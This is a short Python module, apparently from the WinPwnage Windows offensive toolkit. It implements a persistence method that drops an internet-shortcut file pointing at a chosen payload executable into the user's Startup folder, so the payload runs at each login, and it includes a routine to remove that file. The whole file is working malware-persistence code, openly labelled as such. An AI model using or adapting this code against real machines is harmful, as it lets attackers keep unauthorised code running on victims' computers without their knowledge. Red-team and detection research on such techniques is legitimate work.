from winpwnage.core.prints import *
from winpwnage.core.utils import *
import os

persistMethod8_info = {
	"Description": "Persistence using startup files",
	"Method": "Malicious lnk file in startup directory",
	"Id": "8",
	"Type": "Persistence",
	"Fixed In": "99999",
	"Works From": "7600",
	"Admin": False,
	"Function Name": "persistMethod8",
	"Function Payload": True,
}

def persistMethod8(payload, name="", add=True):
	appdata = os.path.expandvars("%AppData%")
	startup_dir = os.path.join(appdata, r'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
	if not os.path.exists(startup_dir):
		print_error("Start up directory not found: {directory}".format(directory=startup_dir))
		return False

	startup_file_path = os.path.join(startup_dir, '{name}.eu.url'.format(name=name))
	if add:
		if payloads().exe(payload):
			with open(startup_file_path, 'w') as f:
				f.write('\n[InternetShortcut]\nURL=file:///{payload}\n'.format(payload=payloads().exe(payload)[1]))
			print_success('Startup file created: {path}'.format(path=startup_file_path))
			print_success("Successfully installed persistence, payload will run at login")
			return True
		else:
			print_error("Cannot proceed, invalid payload")
			return False
	else:
		print_info("Removing startup file ({path})".format(path=startup_file_path))
		try:
			os.remove(startup_file_path)
			print_success("Successfully removed persistence")
		except Exception:
			print_error("Unable to remove persistence")
			return False
